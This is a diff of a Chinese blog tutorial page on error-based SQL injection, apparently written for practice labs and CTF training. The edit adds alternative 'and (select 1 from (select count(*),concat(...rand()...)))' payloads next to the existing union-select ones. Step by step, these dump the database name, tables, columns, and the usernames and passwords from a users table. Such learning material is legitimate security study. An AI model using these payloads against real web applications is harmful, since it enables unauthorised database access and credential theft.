@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://yoursite.com/bbs%20sqli/24.png">
 <meta property="og:image" content="http://yoursite.com/bbs%20sqli/28.jpg">
 <meta property="og:image" content="http://yoursite.com/bbs%20sqli/29.jpg">
-<meta property="og:updated_time" content="2019-07-28T14:57:05.122Z">
+<meta property="og:updated_time" content="2019-07-31T12:45:44.732Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入-报错注入">
 <meta name="twitter:description" content="报错注入在开始之前，我们先了解几个相关函数">
@@ -232,18 +232,24 @@ round(n,l)
 <p><img src="/bbs sqli/19.png"></p>
 <p>由于concat()函数和round()函数，所以是否爆出数据库字是个概率事件，这里用floor()函数爆出的概率没有round()函数爆出的概率大，所以个人习惯用round()函数。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<p>有时union语句用不了，这时就需要换一种方法了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) a from information_schema.columns group by a)b)</span><br></pre></td></tr></table></figure>
 <p>3、爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,round(rand()*2,1)) a from information_schema.columns group by a)b)</span><br></pre></td></tr></table></figure></p>
 <p>表名也得一个个的爆，通过修改limit 后面的第一个参数来实现，后面的字段名和元素值也一样</p>
 <p><img src="/bbs sqli/20.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
 <p><img src="/bbs sqli/23.png"></p>
 <p>爆出的表有：emails，referers，uagents，users，但只有users是我们想要的。</p>
 <p>4、爆字段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,round(rand()*2,1)) a from information_schema.columns group by a)b)</span><br></pre></td></tr></table></figure></p>
 <p><img src="/bbs sqli/24.png"></p>
 <p>爆出来的字段有三个：id，username，password<br>5、爆元素值</p>
 <p>爆用户名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,round(rand()*2,1)) a from information_schema.columns group by a)b)</span><br></pre></td></tr></table></figure></p>
 <p><img src="/bbs sqli/28.jpg"></p>
 <p>爆密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select password from users limit 0,1),0x3a,0x3a,round(rand()*2,0)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,(select password from users limit 0,1),0x3a,0x3a,round(rand()*2,1)) a from information_schema.columns group by a)b)</span><br></pre></td></tr></table></figure></p>
 <p><img src="/bbs sqli/29.jpg"></p>
 <p><strong>总结：</strong> 报错注入的特点就是当SQL语句执行错误时，数据库的信息就会随着报错而爆出来，这比基本注入又麻烦了一点，但跟盲注比起来，这还算好的，盲注要是不会写脚本的话会很麻烦，现在小白真正学着写脚本，要不了多久就可以突破盲注这一大关了。</p>
 
@@ -558,6 +564,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">PHP</a>
               </li>
              
@@ -566,23 +580,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+                <a href="javascript:void(0)" class="js-tag color4">css</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">css</a>
               </li>
              
               <li class="article-tag-list-item">
